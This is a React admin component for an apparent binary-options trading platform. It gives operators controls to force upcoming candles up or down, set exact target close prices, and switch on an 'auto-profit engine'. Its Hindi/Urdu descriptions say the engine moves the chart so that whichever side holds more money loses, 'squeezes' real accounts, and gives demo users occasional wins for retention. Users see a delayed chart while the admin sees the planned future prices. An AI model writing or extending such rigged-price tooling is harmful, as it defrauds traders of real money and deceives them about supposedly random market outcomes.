'use client'
import { useEffect, useRef, useState } from 'react'
import { getSocket } from '@/lib/socketClient'

const TIMEFRAMES = ['5s', '15s', '30s', '1m', '5m']

export default function AdminCandles() {
  const [assets, setAssets] = useState([])
  const [symbol, setSymbol] = useState('')
  const [tf, setTf] = useState('1m')
  const [data, setData] = useState(null) // admin:plan series
  const [strength, setStrength] = useState(3)
  const [target, setTarget] = useState('')
  const [affectCurrent, setAffectCurrent] = useState(false)
  const [busy, setBusy] = useState(false)
  const [connected, setConnected] = useState(false)
  const sockRef = useRef(null)

  // asset list for the selector
  useEffect(() => {
    fetch('/api/assets')
      .then((r) => r.json())
      .then((d) => {
        const list = d.assets || []
        setAssets(list)
        if (list.length && !symbol) setSymbol(list[0].symbol)
      })
      .catch(() => {})
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // socket: watch the chosen (symbol, tf), receive the live future plan
  useEffect(() => {
    let on = true
    const onPlan = (series) => {
      if (series && series.symbol === symbol && series.timeframe === tf) setData(series)
    }
    const onConnect = () => setConnected(true)
    const onDisconnect = () => setConnected(false)
    getSocket().then((s) => {
      if (!on) return
      sockRef.current = s
      s.on('admin:plan', onPlan)
      s.on('connect', onConnect)
      s.on('disconnect', onDisconnect)
      setConnected(s.connected)
      if (symbol) s.emit('admin:watch_plan', { symbol, timeframe: tf })
    })
    return () => {
      on = false
      const s = sockRef.current
      if (s) {
        s.off('admin:plan', onPlan)
        s.off('connect', onConnect)
        s.off('disconnect', onDisconnect)
      }
    }
  }, [symbol, tf])

  async function setCandle(direction) {
    if (!symbol) return
    setBusy(true)
    const s = sockRef.current || (await getSocket())
    s.emit(
      'admin:set_candle',
      {
        symbol,
        timeframe: tf,
        direction,
        strength: Number(strength),
        target: target !== '' ? Number(target) : null,
        which: affectCurrent ? 'current' : 'next',
      },
      () => {
        setBusy(false)
        setTarget('')
      }
    )
  }

  function clearPlan() {
    const s = sockRef.current
    if (s && symbol) s.emit('admin:clear_plan', { symbol })
  }

  function toggleAuto() {
    const s = sockRef.current
    if (s && symbol) s.emit('admin:auto_asset', { symbol, on: !data?.auto })
  }
  function toggleAutoAll() {
    const s = sockRef.current
    if (s) s.emit('admin:auto_all', { on: !data?.autoAll })
  }
  function setMode(mode) {
    const s = sockRef.current
    if (s) s.emit('admin:auto_mode', { mode })
  }
  function toggleCountDemo() {
    const s = sockRef.current
    if (s) s.emit('admin:auto_count_demo', { on: !data?.countDemo })
  }
  function toggleLiveAsset() {
    const s = sockRef.current
    if (s && data?.liveSupported) s.emit('admin:live_asset', { symbol, on: !data?.live })
  }

  const isLive = !!data?.live // selected asset is on the real feed → no steering

  return (
    <div>
      <div className="mb-4 flex flex-wrap items-center justify-between gap-3">
        <h1 className="text-2xl font-bold">Candle control</h1>
        <div className="flex flex-wrap items-center gap-4">
          <span className={`flex items-center gap-2 text-sm font-semibold ${connected ? 'text-qx-green' : 'text-qx-textMute'}`}>
            <span className={`h-2.5 w-2.5 rounded-full ${connected ? 'bg-qx-green' : 'bg-qx-textMute'}`} />
            {connected ? 'Socket live' : 'Connecting…'}
          </span>
        </div>
      </div>

      {/* selectors */}
      <div className="mb-4 flex flex-wrap items-center gap-3">
        <select value={symbol} onChange={(e) => setSymbol(e.target.value)} className="qx-input max-w-[220px]">
          {assets.map((a) => (
            <option key={a.symbol} value={a.symbol}>{a.symbol}</option>
          ))}
        </select>
        <div className="flex gap-1 rounded-lg bg-qx-panel2 p-1">
          {TIMEFRAMES.map((t) => (
            <button
              key={t}
              onClick={() => setTf(t)}
              className={`rounded-md px-3 py-1.5 text-sm font-bold transition ${t === tf ? 'bg-qx-green text-white' : 'text-qx-textDim hover:text-white'}`}
            >
              {t}
            </button>
          ))}
        </div>
        {data?.price != null && (
          <span className="ml-auto text-sm text-qx-textDim">
            Price: <span className="font-bold text-white tabular-nums">{data.price}</span>
          </span>
        )}
      </div>

      {/* auto-profit (B-book) toggle — hidden for live assets */}
      {!isLive && (
      <div className={`mb-4 flex flex-wrap items-center justify-between gap-3 rounded-xl border p-4 ${data?.auto || data?.autoAll ? 'border-qx-green/60 bg-qx-green/5' : 'border-qx-border bg-qx-panel'}`}>
        <div>
          <div className="flex items-center gap-2 font-bold text-white">
            ⚡ Auto-profit engine
            {data?.autoAll ? (
              <span className="rounded bg-qx-green px-2 py-0.5 text-[11px] font-bold text-white">ON · ALL</span>
            ) : data?.auto ? (
              <span className="rounded bg-qx-green px-2 py-0.5 text-[11px] font-bold text-white">ON</span>
            ) : null}
          </div>
          <p className="mt-1 max-w-xl text-sm text-qx-textDim">
            System har asset ke open trades dekh kar wo close price chunta hai jahan <b>house ka max profit</b> ho
            (jaha zyada paisa wo side haarti), aur graph us hisab se move karta hai. {data?.autoActive && data?.autoTarget != null && (
              <span className="text-qx-green">Steering → {data.autoTarget}</span>
            )}
          </p>
          {/* mode selector: Smart / Balanced / Strict */}
          {(data?.auto || data?.autoAll) && (
            <>
              <div className="mt-2 flex gap-1 rounded-lg bg-qx-panel2 p-1 w-fit">
                <button
                  onClick={() => setMode('smart')}
                  className={`rounded-md px-3 py-1 text-xs font-bold transition ${data?.mode === 'smart' ? 'bg-qx-green text-white' : 'text-qx-textDim hover:text-white'}`}
                >
                  Smart
                </button>
                <button
                  onClick={() => setMode('balanced')}
                  className={`rounded-md px-3 py-1 text-xs font-bold transition ${data?.mode === 'balanced' ? 'bg-[#2F8FEE] text-white' : 'text-qx-textDim hover:text-white'}`}
                >
                  Balanced
                </button>
                <button
                  onClick={() => setMode('strict')}
                  className={`rounded-md px-3 py-1 text-xs font-bold transition ${data?.mode === 'strict' ? 'bg-qx-red text-white' : 'text-qx-textDim hover:text-white'}`}
                >
                  Strict
                </button>
              </div>
              <ModeDescription mode={data?.mode} />
            </>
          )}
          {/* which accounts the algorithm considers */}
          {(data?.auto || data?.autoAll) && (
            <div className="mt-2 flex gap-1 rounded-lg bg-qx-panel2 p-1 w-fit">
              <button
                onClick={() => data?.countDemo && toggleCountDemo()}
                className={`rounded-md px-3 py-1 text-xs font-bold transition ${!data?.countDemo ? 'bg-[#2F8FEE] text-white' : 'text-qx-textDim hover:text-white'}`}
              >
                Real only
              </button>
              <button
                onClick={() => !data?.countDemo && toggleCountDemo()}
                className={`rounded-md px-3 py-1 text-xs font-bold transition ${data?.countDemo ? 'bg-[#2F8FEE] text-white' : 'text-qx-textDim hover:text-white'}`}
              >
                Demo + Real
              </button>
            </div>
          )}
        </div>
        <div className="flex items-center gap-5">
          <label className="flex items-center gap-2 text-sm">
            <span className="text-qx-textDim">This asset</span>
            <button
              onClick={toggleAuto}
              className={`relative h-7 w-14 shrink-0 rounded-full transition ${data?.auto ? 'bg-qx-green' : 'bg-qx-panel2'}`}
              title="Auto-profit for this asset"
            >
              <span className={`absolute top-1 h-5 w-5 rounded-full bg-white transition-all ${data?.auto ? 'left-[30px]' : 'left-1'}`} />
            </button>
          </label>
          <label className="flex items-center gap-2 text-sm">
            <span className="font-bold text-white">ALL assets</span>
            <button
              onClick={toggleAutoAll}
              className={`relative h-7 w-14 shrink-0 rounded-full transition ${data?.autoAll ? 'bg-qx-green' : 'bg-qx-panel2'}`}
              title="Auto-profit for every asset"
            >
              <span className={`absolute top-1 h-5 w-5 rounded-full bg-white transition-all ${data?.autoAll ? 'left-[30px]' : 'left-1'}`} />
            </button>
          </label>
        </div>
      </div>
      )}

      {/* chart — always the built-in Quotex-style chart. Real Market mode feeds
          this same chart from live provider data, so TradingView never breaks UI. */}
      <div className="qx-card p-3">
        <div className="mb-2 flex items-center gap-4 text-xs text-qx-textMute">
          <span className="flex items-center gap-1.5"><span className="h-2 w-3 rounded-sm bg-qx-green" /> Realized / delayed user chart</span>
          {!isLive && <span className="flex items-center gap-1.5"><span className="h-2 w-3 rounded-sm bg-[#2F8FEE]" /> Simulated future plan (admin only)</span>}
          {isLive && <span className="font-semibold text-[#2F8FEE]">TradingView disabled · internal real-feed chart active · no future candles in real market</span>}
        </div>
        <CandleChart data={data} />
      </div>

      {/* controls */}
      <div className="mt-4 grid gap-4 lg:grid-cols-2">
        <div className={`qx-card p-4 ${isLive ? 'opacity-50' : ''}`}>
          <h3 className="mb-3 font-bold text-white">Set next candle</h3>
          {isLive && (
            <p className="mb-3 text-xs font-semibold text-[#2F8FEE]">Disabled — this asset is on the live market. Only generated mode can show/edit next candles.</p>
          )}
          <div className="mb-3 flex items-center gap-3">
            <label className="text-sm text-qx-textDim">Strength</label>
            <select value={strength} onChange={(e) => setStrength(e.target.value)} className="qx-input max-w-[90px]">
              {[1, 2, 3, 4, 5].map((n) => <option key={n} value={n}>{n}</option>)}
            </select>
            <label className="ml-2 flex cursor-pointer items-center gap-2 text-sm text-qx-textDim">
              <input type="checkbox" checked={affectCurrent} onChange={(e) => setAffectCurrent(e.target.checked)} />
              Affect current candle
            </label>
          </div>
          <div className="flex gap-3">
            <button
              onClick={() => setCandle('up')}
              disabled={busy || isLive}
              className="flex flex-1 items-center justify-center gap-2 rounded-lg bg-qx-green py-3 text-base font-bold text-white transition hover:bg-qx-greenHover disabled:opacity-60"
            >
              ▲ Force UP
            </button>
            <button
              onClick={() => setCandle('down')}
              disabled={busy || isLive}
              className="flex flex-1 items-center justify-center gap-2 rounded-lg bg-qx-red py-3 text-base font-bold text-white transition hover:bg-qx-redHover disabled:opacity-60"
            >
              ▼ Force DOWN
            </button>
          </div>
          <div className="mt-4 flex items-end gap-2">
            <div className="flex-1">
              <label className="qx-label">Exact target close (optional)</label>
              <input
                type="number"
                step="any"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                placeholder={data?.price != null ? String(data.price) : 'price'}
                className="qx-input"
              />
            </div>
            <button onClick={() => setCandle('up')} disabled={busy || isLive || target === ''} className="qx-btn-green mb-0.5 px-5">Set</button>
          </div>
          <button onClick={clearPlan} disabled={isLive} className="mt-4 w-full rounded-lg bg-qx-panel2 py-2.5 text-sm font-bold text-white hover:bg-qx-border disabled:opacity-60">
            Clear overrides (back to random)
          </button>
        </div>

        <div className="qx-card p-4">
          <h3 className="mb-3 font-bold text-white">Active overrides</h3>
          {!data?.overrides?.length ? (
            <p className="text-sm text-qx-textMute">No active overrides — candles are running normally.</p>
          ) : (
            <ul className="space-y-2">
              {data.overrides.map((o, i) => (
                <li key={i} className="flex items-center justify-between rounded-lg bg-qx-input px-3 py-2 text-sm">
                  <span className="font-semibold text-white">
                    {o.tf} ·{' '}
                    <span className={o.direction === 'down' ? 'text-qx-red' : o.direction === 'up' ? 'text-qx-green' : 'text-[#2F8FEE]'}>
                      {o.direction === 'target' ? `target ${o.target}` : o.direction.toUpperCase()}
                    </span>
                  </span>
                  <span className="text-qx-textMute">closes in {Math.max(0, Math.round((o.bEndMs - Date.now()) / 1000))}s</span>
                </li>
              ))}
            </ul>
          )}
        </div>
      </div>
    </div>
  )
}

// Description shown under the mode selector so the admin knows what each
// algorithm does and which one is safest/most natural-looking.
function ModeDescription({ mode }) {
  const descriptions = {
    smart: {
      title: 'Smart (realistic)',
      text: 'Demo users ko 20% mercy milti hai. Real accounts always squeeze hoti hain. Demo retention ke liye best.',
      badge: 'text-qx-green',
    },
    balanced: {
      title: 'Balanced (recommended)',
      text: 'Total stake $40 se kam ho toh trades random/natural rahti hain. $40+ hone par house profit active hota hai: single user 45% jeet sakta hai, crowd pe zyada squeeze.',
      badge: 'text-[#2F8FEE]',
    },
    strict: {
      title: 'Strict (max squeeze)',
      text: 'Hamesha house profit target. Koi mercy nahi. Sirf jab sab users ek hi side pe heavy money laga rahe hon.',
      badge: 'text-qx-red',
    },
  }
  const d = descriptions[mode] || descriptions.balanced
  return (
    <div className="mt-2 max-w-xl text-[11px] leading-relaxed text-qx-textDim">
      <span className={`font-bold ${d.badge}`}>{d.title}:</span>{' '}
      {d.text}
    </div>
  )
}

// Lightweight SVG candlestick: realized candles (history + forming) + planned
// future candles (highlighted blue). Future ones are what the admin set/sees.
function CandleChart({ data }) {
  if (!data) return <div className="flex h-[280px] items-center justify-center text-sm text-qx-textMute">Loading…</div>
  const past = (data.candles || []).slice(-40)
  const forming = data.forming ? [{ ...data.forming, _forming: true }] : []
  const future = (data.future || []).map((c) => ({ ...c, _future: true }))
  const all = [...past, ...forming, ...future]
  if (!all.length) return <div className="flex h-[280px] items-center justify-center text-sm text-qx-textMute">No data</div>

  const W = 900
  const H = 280
  const PAD = 8
  const lo = Math.min(...all.map((c) => c.low))
  const hi = Math.max(...all.map((c) => c.high))
  const range = hi - lo || 1
  const y = (v) => PAD + (H - PAD * 2) * (1 - (v - lo) / range)
  const n = all.length
  const step = W / n
  const bw = Math.max(2, step * 0.6)

  const firstFutureIdx = past.length + forming.length

  return (
    <svg viewBox={`0 0 ${W} ${H}`} className="w-full" style={{ height: 280 }}>
      {/* divider: where the user's "now" ends and admin-only future begins */}
      {future.length > 0 && (
        <line x1={firstFutureIdx * step} x2={firstFutureIdx * step} y1={0} y2={H} stroke="#2F8FEE" strokeOpacity="0.4" strokeDasharray="4 4" />
      )}
      {all.map((c, i) => {
        const x = i * step + step / 2
        const up = c.close >= c.open
        const isFuture = c._future
        const color = isFuture ? '#2F8FEE' : up ? '#00C076' : '#FF3B3B'
        const bodyTop = y(Math.max(c.open, c.close))
        const bodyBot = y(Math.min(c.open, c.close))
        return (
          <g key={i} opacity={isFuture ? 0.85 : 1}>
            <line x1={x} x2={x} y1={y(c.high)} y2={y(c.low)} stroke={color} strokeWidth="1" />
            <rect
              x={x - bw / 2}
              y={bodyTop}
              width={bw}
              height={Math.max(1, bodyBot - bodyTop)}
              fill={color}
              opacity={c._forming ? 0.7 : 1}
            />
          </g>
        )
      })}
    </svg>
  )
}
